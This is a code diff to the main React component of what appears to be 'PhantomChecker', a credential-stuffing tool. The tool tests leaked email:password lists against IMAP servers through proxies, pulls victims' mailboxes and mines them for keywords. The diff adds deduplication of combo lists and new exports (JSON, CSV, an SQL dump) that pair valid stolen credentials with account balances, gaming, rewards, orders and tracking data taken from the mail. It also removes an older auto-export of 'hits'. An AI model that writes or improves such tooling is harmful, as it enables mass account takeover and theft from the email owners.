@@ -1,15 +1,22 @@
 import { useState, useEffect, useRef, useMemo, useCallback } from 'react';
 import { isCanadianEmail, getImapConfigForEmail } from './data/canadianDomains.js';
 import { INITIAL_KEYWORD_TARGETS } from './data/mockMails.js';
-import { Header } from './components/Header.jsx';
+import { Sidebar } from './components/Sidebar.jsx';
+import { SplashScreen } from './components/SplashScreen.jsx';
 import { CheckerStudioTab } from './components/Tabs/CheckerStudioTab.jsx';
 import { ProxyTab } from './components/Tabs/ProxyTab.jsx';
 import { MailViewerTab } from './components/Tabs/MailViewerTab.jsx';
 import { KeywordTargetTab } from './components/Tabs/KeywordTargetTab.jsx';
 import { CanadianDomainsTab } from './components/Tabs/CanadianDomainsTab.jsx';
+import { testKeywordMatch } from './utils/keywordMatcher.js';
 
 export default function App() {
-  const [activeTab, setActiveTab] = useState('checker');
+  const [showSplash, setShowSplash] = useState(() => {
+    try { return new URLSearchParams(window.location.search).get('nosplash') !== '1'; } catch { return true; }
+  });
+  const [activeTab, setActiveTab] = useState(() => {
+    try { return new URLSearchParams(window.location.search).get('tab') || 'checker'; } catch { return 'checker'; }
+  });
   const [combos, setCombos] = useState([]);
   const [proxies, setProxies] = useState([]);
   const [proxyMode, setProxyMode] = useState('none');
@@ -55,85 +62,7 @@ export default function App() {
     isRunningRef.current = isRunning;
   }, [isRunning]);
 
-  // ── Auto-export hits when run completes ──────────────────────────────────
-  const prevIsRunningRef = useRef(false);
   const [exportToast, setExportToast] = useState(null);
-
-  useEffect(() => {
-    const wasRunning = prevIsRunningRef.current;
-    prevIsRunningRef.current = isRunning;
-
-    // Only trigger when transitioning from running → stopped
-    if (!wasRunning || isRunning) return;
-
-    const validCount = combos.filter(c => c.status === 'valid').length;
-    if (validCount === 0) return;
-
-    const doExport = async () => {
-      const payload = { combos, keywords, mails, stats };
-
-      // Electron: write real files and open folder
-      if (window.phantomAPI?.exportHitsFolder) {
-        const result = await window.phantomAPI.exportHitsFolder(payload);
-        if (result.success) {
-          setExportToast({ type: 'success', msg: `Hits folder saved → ${result.path}` });
-        } else {
-          setExportToast({ type: 'error', msg: `Export failed: ${result.error}` });
-        }
-        setTimeout(() => setExportToast(null), 6000);
-        return;
-      }
-
-      // Browser dev fallback: download individual files
-      const now = new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19);
-      const validCombos = combos.filter(c => c.status === 'valid');
-      const canadianCombos = validCombos.filter(c => c.isCanadian);
-      const tfaCombos = combos.filter(c => c.status === '2fa');
-
-      const dl = (content, name) => {
-        if (!content.trim()) return;
-        const blob = new Blob([content], { type: 'text/plain' });
-        const url = URL.createObjectURL(blob);
-        const a = document.createElement('a');
-        a.href = url; a.download = name; a.click();
-        URL.revokeObjectURL(url);
-      };
-
-      dl(validCombos.map(c => `${c.email}:${c.password}`).join('\n'), `${now}_valid_all.txt`);
-      setTimeout(() => dl(canadianCombos.map(c => `${c.email}:${c.password}`).join('\n'), `${now}_valid_canadian.txt`), 300);
-      setTimeout(() => dl(tfaCombos.map(c => `${c.email}:${c.password}`).join('\n'), `${now}_2fa_locked.txt`), 600);
-
-      // Keyword files
-      const kwMap = {};
-      mails.forEach(mail => {
-        if (!mail.matchedTargets?.length) return;
-        const combo = validCombos.find(c => c.email.toLowerCase() === mail.email?.toLowerCase());
-        if (!combo) return;
-        mail.matchedTargets.forEach(kw => {
-          if (!kwMap[kw]) kwMap[kw] = new Set();
-          kwMap[kw].add(`${combo.email}:${combo.password}`);
-        });
-      });
-      validCombos.forEach(c => {
-        c.matchedKeywords?.forEach(kw => {
-          if (!kwMap[kw]) kwMap[kw] = new Set();
-          kwMap[kw].add(`${c.email}:${c.password}`);
-        });
-      });
-      let delay = 900;
-      for (const [kw, entries] of Object.entries(kwMap)) {
-        if (!entries.size) continue;
-        const safeName = kw.replace(/[^a-z0-9_-]/gi, '_');
-        setTimeout(() => dl(Array.from(entries).join('\n'), `${now}_kw_${safeName}.txt`), delay);
-        delay += 200;
-      }
-
-      setExportToast({ type: 'success', msg: `${validCount} hit(s) exported as downloads` });
-      setTimeout(() => setExportToast(null), 5000);
-    };
-
-    doExport();
-  }, [isRunning]);
 
   useEffect(() => {
     if (proxies.length > 0 && proxyMode === 'none') {
@@ -166,9 +95,13 @@ export default function App() {
     return keywords.map(k => {
       const q = (k.keyword || '').toLowerCase().trim();
       if (!q) return { ...k, hitsCount: 0 };
+      
       let count = 0;
-      for (let i = 0; i < mailCorpuses.length; i++) {
-        if (mailCorpuses[i].includes(q)) count++;
+      for (let i = 0; i < mails.length; i++) {
+        const m = mails[i];
+        if (testKeywordMatch(mailCorpuses[i], q, { fromAddr: m.senderEmail, fromName: m.sender, subject: m.subject })) {
+          count++;
+        }
       }
       return { ...k, hitsCount: count };
     });
@@ -276,6 +209,7 @@ export default function App() {
     setParsingStatus({ fileName: file.name, loadedCount: 0, percent: 0 });
 
     let accumulatedBatch = [];
+    const seenInSession = new Set();
 
     while (offset < size) {
       const slice = file.slice(offset, Math.min(offset + CHUNK_BYTES, size));
@@ -294,8 +228,12 @@ export default function App() {
       for (let i = 0; i < lines.length; i++) {
         const item = parseSingleLine(lines[i].trim());
         if (item) {
-          accumulatedBatch.push(item);
-          totalLoadedSoFar++;
+          const key = `${item.email.toLowerCase()}:${item.password}`;
+          if (!seenInSession.has(key)) {
+            seenInSession.add(key);
+            accumulatedBatch.push(item);
+            totalLoadedSoFar++;
+          }
         }
       }
 
@@ -317,8 +255,12 @@ export default function App() {
     if (leftover) {
       const item = parseSingleLine(leftover.trim());
       if (item) {
-        accumulatedBatch.push(item);
-        totalLoadedSoFar++;
+        const key = `${item.email.toLowerCase()}:${item.password}`;
+        if (!seenInSession.has(key)) {
+          seenInSession.add(key);
+          accumulatedBatch.push(item);
+          totalLoadedSoFar++;
+        }
       }
     }
 
@@ -338,14 +280,51 @@ export default function App() {
   const parseRawCombos = useCallback((text) => {
     const lines = text.split(/\r?\n/);
     const items = [];
+    const seen = new Set();
     for (const line of lines) {
       const item = parseSingleLine(line.trim());
-      if (item) items.push(item);
+      if (item) {
+        const key = `${item.email.toLowerCase()}:${item.password}`;
+        if (!seen.has(key)) {
+          seen.add(key);
+          items.push(item);
+        }
+      }
     }
     if (items.length > 0) {
-      setCombos(prev => [...prev, ...items]);
+      setCombos(prev => {
+        const prevSeen = new Set(prev.map(p => `${p.email.toLowerCase()}:${p.password}`));
+        const uniqueNew = items.filter(it => !prevSeen.has(`${it.email.toLowerCase()}:${it.password}`));
+        return [...prev, ...uniqueNew];
+      });
     }
   }, [parseSingleLine]);
+
+  // Instant non-blocking deduplication
+  const handleRemoveDuplicates = useCallback(() => {
+    setCombos(prev => {
+      const seen = new Set();
+      const unique = [];
+      let dupesCount = 0;
+      for (const c of prev) {
+        const key = `${c.email.toLowerCase()}:${c.password}`;
+        if (!seen.has(key)) {
+          seen.add(key);
+          unique.push(c);
+        } else {
+          dupesCount++;
+        }
+      }
+      setExportToast({
+        type: 'success',
+        msg: dupesCount > 0
+          ? `✓ Deduplicated: Removed ${dupesCount} duplicate combo(s). (${unique.length} unique retained)`
+          : `✓ Clean list: 0 duplicates found in ${unique.length} combo(s).`
+      });
+      setTimeout(() => setExportToast(null), 4000);
+      return unique;
+    });
+  }, []);
 
   const handleFileUpload = useCallback(async (fileList) => {
     for (let i = 0; i < fileList.length; i++) {
@@ -413,7 +392,7 @@ export default function App() {
   const fetchRealFoldersForHit = useCallback(async (item, proxy = null) => {
     try {
       const controller = new AbortController();
-      const timer = setTimeout(() => controller.abort(), 12000);
+      const timer = setTimeout(() => controller.abort(), 25000);
       const res = await fetch('/api/fetch-all-folders', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -423,8 +402,8 @@ export default function App() {
           port: item.imapPort,
           email: item.email,
           password: item.password,
-          maxPerFolder: 10,
-          timeout: 10000,
+          maxPerFolder: 15,
+          timeout: 20000,
           keywords: keywords.map(k => k.keyword),
           proxy
         })
@@ -434,7 +413,14 @@ export default function App() {
       if (data.success && data.mails && data.mails.length > 0) {
         setMails(prev => {
           const filtered = prev.filter(m => m.email.toLowerCase() !== item.email.toLowerCase());
-          return [...data.mails, ...filtered];
+          const dedupedMap = new Map();
+          data.mails.forEach(m => {
+            if (m && m.id) dedupedMap.set(m.id, m);
+          });
+          filtered.forEach(m => {
+            if (m && m.id && !dedupedMap.has(m.id)) dedupedMap.set(m.id, m);
+          });
+          return Array.from(dedupedMap.values());
         });
 
         const allHits = new Set();
@@ -664,13 +650,101 @@ export default function App() {
       return;
     }
 
+    // Enrich hits with extracted assets
+    const enrichedHits = valid.map(c => {
+      const accountMails = mails.filter(m => m.email && m.email.toLowerCase() === c.email.toLowerCase());
+      const balances = [...new Set(accountMails.flatMap(m => m.extractedData?.balances || []))];
+      const gaming = [...new Set(accountMails.flatMap(m => m.extractedData?.gaming || []))];
+      const rewards = [...new Set(accountMails.flatMap(m => m.extractedData?.rewards || []))];
+      const memberships = [...new Set(accountMails.flatMap(m => m.extractedData?.memberships || []))];
+      const orders = [...new Set(accountMails.flatMap(m => m.extractedData?.orders || []))];
+      const tracking = [...new Set(accountMails.flatMap(m => (m.extractedData?.tracking || []).map(t => `${t.carrier}:${t.trackingNumber}`)))];
+
+      return {
+        ...c,
+        extracted: {
+          balances,
+          gaming,
+          rewards,
+          memberships,
+          orders,
+          tracking
+        }
+      };
+    });
+
     if (format === 'json') {
-      const content = JSON.stringify(valid, null, 2);
-      downloadFile(content, 'imap_valid_hits.json', 'application/json');
+      const content = JSON.stringify(enrichedHits, null, 2);
+      downloadFile(content, 'imap_valid_hits_enriched.json', 'application/json');
+    } else if (format === 'jsonl') {
+      const content = enrichedHits.map(item => JSON.stringify(item)).join('\n');
+      downloadFile(content, 'imap_valid_hits.jsonl', 'application/x-ndjson');
+    } else if (format === 'csv_full') {
+      const headers = 'Email,Password,Domain,IMAP Host,IMAP Port,Status,Matched Keywords,Balances,Gaming,Rewards,Memberships,Orders,Tracking\n';
+      const rows = enrichedHits.map(c => {
+        const esc = (val) => `"${String(val || '').replace(/"/g, '""')}"`;
+        return [
+          esc(c.email),
+          esc(c.password),
+          esc(c.domain),
+          esc(c.imapHost),
+          c.imapPort || 993,
+          esc(c.status),
+          esc((c.matchedKeywords || []).join('; ')),
+          esc(c.extracted.balances.join('; ')),
+          esc(c.extracted.gaming.join('; ')),
+          esc(c.extracted.rewards.join('; ')),
+          esc(c.extracted.memberships.join('; ')),
+          esc(c.extracted.orders.join('; ')),
+          esc(c.extracted.tracking.join('; '))
+        ].join(',');
+      }).join('\n');
+      downloadFile(headers + rows, 'imap_valid_hits_full_assets.csv', 'text/csv');
     } else if (format === 'csv') {
       const headers = 'Email,Password,Domain,IMAP Host,IMAP Port,Status,Matched Keywords\n';
       const rows = valid.map(c => `"${c.email}","${c.password}","${c.domain}","${c.imapHost}",${c.imapPort},"${c.status}","${(c.matchedKeywords||[]).join(';')}"`).join('\n');
       downloadFile(headers + rows, 'imap_valid_hits.csv', 'text/csv');
+    } else if (format === 'sql') {
+      let sql = `-- PhantomChecker Database Hit Dump (SQLite 3.24+ & PostgreSQL Compatible)\n`;
+      sql += `CREATE TABLE IF NOT EXISTS imap_hits (\n`;
+      sql += `  email VARCHAR(255) PRIMARY KEY,\n`;
+      sql += `  password TEXT,\n`;
+      sql += `  domain VARCHAR(255),\n`;
+      sql += `  imap_host VARCHAR(255),\n`;
+      sql += `  imap_port INTEGER,\n`;
+      sql += `  status VARCHAR(50),\n`;
+      sql += `  matched_keywords TEXT,\n`;
+      sql += `  balances TEXT,\n`;
+      sql += `  gaming TEXT,\n`;
+      sql += `  rewards TEXT,\n`;
+      sql += `  memberships TEXT,\n`;
+      sql += `  orders TEXT,\n`;
+      sql += `  tracking TEXT\n`;
+      sql += `);\n\n`;
+
+      const inserts = enrichedHits.map(c => {
+        const sq = (s) => `'${String(s || '').replace(/'/g, "''")}'`;
+        const colList = 'email, password, domain, imap_host, imap_port, status, matched_keywords, balances, gaming, rewards, memberships, orders, tracking';
+        const valList = [
+          sq(c.email),
+          sq(c.password),
+          sq(c.domain),
+          sq(c.imapHost),
+          Number(c.imapPort) || 993,
+          sq(c.status),
+          sq((c.matchedKeywords || []).join(';')),
+          sq(c.extracted.balances.join(';')),
+          sq(c.extracted.gaming.join(';')),
+          sq(c.extracted.rewards.join(';')),
+          sq(c.extracted.memberships.join(';')),
+          sq(c.extracted.orders.join(';')),
+          sq(c.extracted.tracking.join(';'))
+        ].join(', ');
+
+        return `INSERT INTO imap_hits (${colList}) VALUES (${valList}) ON CONFLICT (email) DO UPDATE SET password=EXCLUDED.password, status=EXCLUDED.status, matched_keywords=EXCLUDED.matched_keywords, balances=EXCLUDED.balances, gaming=EXCLUDED.gaming, rewards=EXCLUDED.rewards, memberships=EXCLUDED.memberships, orders=EXCLUDED.orders, tracking=EXCLUDED.tracking;`;
+      }).join('\n');
+
+      downloadFile(sql + inserts, 'imap_hits_dump.sql', 'application/sql');
     } else if (format === 'txt_full') {
       const content = valid.map(c => `${c.email}:${c.password}:${c.imapHost}:${c.imapPort}`).join('\n');
       downloadFile(content, 'imap_valid_hits_full.txt', 'text/plain');
@@ -751,13 +825,18 @@ export default function App() {
 
   return (
     <div style={{
-      height: activeTab === 'mail-viewer' ? '100vh' : 'auto',
-      minHeight: '100vh',
       display: 'flex',
-      flexDirection: 'column',
+      flexDirection: 'row',
+      width: '100vw',
+      height: '100vh',
       background: '#05070d',
-      overflow: activeTab === 'mail-viewer' ? 'hidden' : 'visible'
+      overflow: 'hidden',
+      position: 'relative'
     }}>
+      {/* ── Animated Splash Screen on Launch or on Demand ── */}
+      {showSplash && (
+        <SplashScreen onDismiss={() => setShowSplash(false)} />
+      )}
 
       {/* ── Auto-Export Toast Notification ─────────────────────────────── */}
       {exportToast && (
@@ -793,24 +872,29 @@ export default function App() {
         </div>
       )}
 
-      <Header
+      {/* ── Left Sidebar Navigation (Top to Bottom) & Telemetry Controls ── */}
+      <Sidebar
         activeTab={activeTab}
         setActiveTab={setActiveTab}
         stats={stats}
         isRunning={isRunning}
+        useLiveSocket={useLiveSocket}
         onStart={startCheckerEngine}
         onStop={stopCheckerEngine}
         onClear={clearAll}
+        onShowSplash={() => setShowSplash(true)}
       />
 
+      {/* ── Main Workspace Area (Right) ─────────────────────────────────── */}
       <main style={{
         flex: 1,
-        width: '100%',
-        padding: activeTab === 'mail-viewer' ? '10px 18px 12px' : '16px 20px',
+        minWidth: 0,
+        height: '100vh',
         display: 'flex',
         flexDirection: 'column',
-        minHeight: 0,
-        overflow: activeTab === 'mail-viewer' ? 'hidden' : 'visible'
+        overflowY: activeTab === 'mail-viewer' ? 'hidden' : 'auto',
+        overflowX: 'hidden',
+        padding: activeTab === 'mail-viewer' ? '8px 12px' : '16px 20px'
       }}>
         {activeTab === 'checker' && (
           <CheckerStudioTab
@@ -833,6 +917,7 @@ export default function App() {
             proxyCount={proxies.length}
             setActiveTab={setActiveTab}
             parsingStatus={parsingStatus}
+            onRemoveDuplicates={handleRemoveDuplicates}
           />
         )}
 
@@ -847,7 +932,7 @@ export default function App() {
           />
         )}
 
-        {activeTab === 'mail-viewer' && (
+        <div style={{ display: activeTab === 'mail-viewer' ? 'block' : 'none', height: '100%' }}>
           <MailViewerTab
             mailboxes={validAccounts}
             setValidAccounts={setValidAccounts}
@@ -859,8 +944,10 @@ export default function App() {
             onAddTargetKeyword={handleAddTargetKeyword}
             combos={combos}
             keywords={keywords}
+            onLoadSampleCombos={handleLoadSampleCombos}
+            setActiveTab={setActiveTab}
           />
-        )}
+        </div>
 
         {(activeTab === 'keyword-targets' || activeTab === 'keywords') && (
           <KeywordTargetTab
